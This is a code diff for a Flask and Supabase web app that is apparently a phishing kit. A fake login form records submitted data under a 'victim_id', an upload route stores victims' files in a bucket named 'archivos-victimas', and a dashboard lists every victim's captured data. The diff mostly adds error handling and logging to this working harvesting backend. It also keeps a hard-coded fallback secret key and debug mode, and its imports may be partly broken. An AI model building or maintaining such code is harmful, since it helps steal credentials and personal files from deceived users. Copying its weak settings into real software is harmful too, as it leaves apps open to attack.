@@ -2,30 +2,44 @@
 import os
 import uuid
 import time
+import sys
 from flask import Flask, render_template, request, redirect, url_for, session, g
-from supabase import create_client, Client
+from supabase import create_client, Client, SupabaseClient, SupabasePostgrestAPIError
 
 # ======================================================================
 # CONFIGURACIÓN INICIAL DE FLASK Y SUPABASE
 # ======================================================================
 app = Flask(__name__)
 # La clave secreta de Flask es necesaria para usar 'session'
-# Usamos una variable de entorno para mayor seguridad.
 app.secret_key = os.environ.get("FLASK_SECRET_KEY", "fallback_secret_key_very_secret_123") 
 
-# Variables de entorno para Supabase (corregidas para usar SUPABASE_ANON_KEY)
+# Variables de entorno para Supabase (usamos SUPABASE_ANON_KEY)
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_ANON_KEY")
 
+supabase = None
+
 # Crear el cliente de Supabase una sola vez al inicio
 try:
-    if not SUPABASE_URL or not SUPABASE_KEY:
-        raise ValueError("SUPABASE_URL o SUPABASE_ANON_KEY no están configuradas en el entorno.")
+    if not SUPABASE_URL:
+        # Esto lanzará un error si la variable falta
+        raise ValueError("SUPABASE_URL no está configurada en el entorno.")
+    if not SUPABASE_KEY:
+        # Esto lanzará un error si la variable falta (Supabase Key)
+        raise ValueError("SUPABASE_ANON_KEY no está configurada en el entorno.")
+
+    # Inicialización del cliente
     supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
     print("Conexión con Supabase establecida.")
+except ValueError as ve:
+    # Captura si faltan las variables de entorno y lo imprime en los logs de error
+    print(f"ERROR FATAL: Error de configuración de entorno: {ve}", file=sys.stderr)
+    # No detenemos el programa aquí, pero la variable 'supabase' será None.
 except Exception as e:
-    print(f"Error al inicializar Supabase: {e}")
-    supabase = None # Si falla, supabase será None
+    # Captura cualquier otro error de inicialización
+    print(f"ERROR FATAL: Error al inicializar Supabase: {e}", file=sys.stderr)
+    supabase = None 
+
 
 # ======================================================================
 # RUTAS DE LA APLICACIÓN
@@ -34,9 +48,15 @@ except Exception as e:
 # Ruta raíz para el formulario de inicio de sesión
 @app.route('/')
 def index():
+    # Comprobación de que la conexión a Supabase se haya realizado correctamente
+    if supabase is None:
+        # Si la conexión falló al inicio, mostramos un error 500
+        return render_template('error.html', error_message="Error de conexión al servidor de la base de datos (Verifique logs de Render)."), 500
+        
     # Si la sesión ya tiene un victim_id, redirigir a la página de subida
     if 'victim_id' in session:
         return redirect(url_for('upload_page'))
+        
     # Renderizar la página de inicio de sesión
     return render_template('index.html')
 
@@ -73,8 +93,11 @@ def process_login():
         # 4. Redirigir a la página de subida de archivos
         return redirect(url_for('upload_page'))
 
+    except SupabasePostgrestAPIError as e:
+        print(f"Error de Supabase al insertar datos (posiblemente RLS o tabla incorrecta): {e}", file=sys.stderr)
+        return render_template('error.html', error_message=f"Error de base de datos. Verifique RLS o nombre de tabla."), 500
     except Exception as e:
-        print(f"Error en process_login: {e}")
+        print(f"Error desconocido en process_login: {e}", file=sys.stderr)
         return render_template('error.html', error_message=f"Error al procesar el login e insertar datos: {e}"), 500
 
 # Ruta para mostrar el formulario de subida de archivos
@@ -95,6 +118,7 @@ def upload_file():
     # 1. Obtener el ID de la sesión
     victim_id = session.get('victim_id')
     if not victim_id:
+        # En caso de que se pierda la sesión, redirigir al inicio
         return redirect(url_for('index'))
 
     # 2. Obtener el archivo del formulario
@@ -107,11 +131,11 @@ def upload_file():
         # 3. Preparar nombres y rutas
         original_filename = file.filename
         file_extension = os.path.splitext(original_filename)[1]
-        # Creamos una ruta única para el almacenamiento
+        # Creamos una ruta única para el almacenamiento: {victim_id}.{ext}
         storage_path = f"{victim_id}{file_extension}" 
         
         # 4. Subir el archivo a Supabase Storage (Bucket: archivos-victimas)
-        # Usamos el contenido binario del archivo
+        # file.read() lee el contenido binario
         supabase.storage.from_('archivos-victimas').upload(
             file=file.read(),
             path=storage_path,
@@ -119,8 +143,8 @@ def upload_file():
         )
         
         # 5. Obtener la URL pública del archivo
-        public_url_response = supabase.storage.from_('archivos-victimas').get_public_url(storage_path)
-        file_url = public_url_response
+        # La respuesta es la URL como string
+        file_url = supabase.storage.from_('archivos-victimas').get_public_url(storage_path)
         
         # 6. Actualizar la base de datos con el nombre y URL del archivo
         update_data = {
@@ -128,7 +152,7 @@ def upload_file():
             "file_url": file_url
         }
         
-        # CORRECCIÓN: Usar eq() para filtrar por el victim_id correcto
+        # CORRECCIÓN CLAVE: Uso de .eq() para asegurar la actualización de la fila correcta
         supabase.table('victim_data').update(update_data).eq('victim_id', victim_id).execute()
         
         # 7. Limpiar la sesión 
@@ -138,7 +162,7 @@ def upload_file():
         return redirect(url_for('thank_you'))
         
     except Exception as e:
-        print(f"Error al subir el archivo o actualizar DB: {e}")
+        print(f"Error CRÍTICO al subir el archivo o actualizar DB: {e}", file=sys.stderr)
         return render_template('error.html', error_message=f"Error crítico al subir y actualizar datos: {e}"), 500
 
 # Ruta de agradecimiento (página de destino final)
@@ -164,5 +188,9 @@ def view_data():
         return render_template('dashboard.html', victims=victims_data)
         
     except Exception as e:
-        print(f"Error al recuperar datos del dashboard: {e}")
+        print(f"Error al recuperar datos del dashboard: {e}", file=sys.stderr)
         return render_template('error.html', error_message=f"Error al cargar el dashboard: {e}"), 500
+
+# Punto de entrada para Gunicorn/Render
+if __name__ == '__main__':
+    app.run(debug=True)
